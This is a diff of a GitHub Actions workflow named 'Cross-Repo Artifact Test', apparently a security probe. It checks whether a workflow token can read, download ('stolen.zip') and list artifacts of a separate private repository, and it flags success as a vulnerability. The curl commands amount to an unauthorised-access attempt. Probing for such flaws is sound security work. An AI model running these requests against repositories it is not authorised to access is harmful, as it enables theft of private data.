@@ -1,30 +1,35 @@
 name: Cross-Repo Artifact Test
-on: push
+on: workflow_dispatch
 jobs:
   steal:
     runs-on: ubuntu-latest
     permissions:
       actions: read
     steps:
-      - name: Try to download artifact from private-target
+      - name: Try to access private-target artifacts
+        env:
+          GH_TOKEN: ${{ github.token }}
         run: |
-          echo "=== Attempt 1: Direct API to private repo artifact ==="
-          curl -s -w "\nHTTP_CODE:%{http_code}"             -H "Authorization: Bearer ${{ github.token }}"             -H "Accept: application/vnd.github+json"             "https://api.github.com/repos/e0X1337/private-target/actions/artifacts/8674075087" | tail -5
-          
+          echo "=== Attempt 1: Get artifact metadata ==="
+          curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/e0X1337/private-target/actions/artifacts/8674075087"
+
           echo ""
-          echo "=== Attempt 2: Download the zip ==="
-          curl -s -w "\nHTTP_CODE:%{http_code}" -L             -H "Authorization: Bearer ${{ github.token }}"             "https://api.github.com/repos/e0X1337/private-target/actions/artifacts/8674075087/zip"             -o /tmp/stolen.zip
-          ls -la /tmp/stolen.zip 2>/dev/null && unzip -p /tmp/stolen.zip 2>/dev/null || echo "Download failed or empty"
-          
+          echo "=== Attempt 2: Download artifact zip ==="
+          HTTP_CODE=$(curl -s -o /tmp/stolen.zip -w "%{http_code}" -L \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/repos/e0X1337/private-target/actions/artifacts/8674075087/zip")
+          echo "HTTP status: $HTTP_CODE"
+          if [ -f /tmp/stolen.zip ] && [ $(stat -f%z /tmp/stolen.zip 2>/dev/null || stat -c%s /tmp/stolen.zip 2>/dev/null) -gt 0 ]; then
+            echo "VULNERABILITY: Downloaded artifact from private repo!"
+            unzip -p /tmp/stolen.zip
+          else
+            echo "Access denied (expected)"
+          fi
+
           echo ""
-          echo "=== Attempt 3: List artifacts from private repo ==="
-          curl -s -w "\nHTTP_CODE:%{http_code}"             -H "Authorization: Bearer ${{ github.token }}"             "https://api.github.com/repos/e0X1337/private-target/actions/artifacts" | python3 -c "
-import json,sys
-data = json.load(sys.stdin)
-if 'message' in data:
-    print(f'Error: {data[\"message\"]}')
-elif 'total_count' in data:
-    print(f'Found {data[\"total_count\"]} artifacts! POTENTIAL VULNERABILITY')
-    for a in data.get('artifacts', []):
-        print(f'  - {a[\"name\"]} (id={a[\"id\"]})')
-" 2>/dev/null || echo "Parse error"
+          echo "=== Attempt 3: List all artifacts in private repo ==="
+          curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/e0X1337/private-target/actions/artifacts"
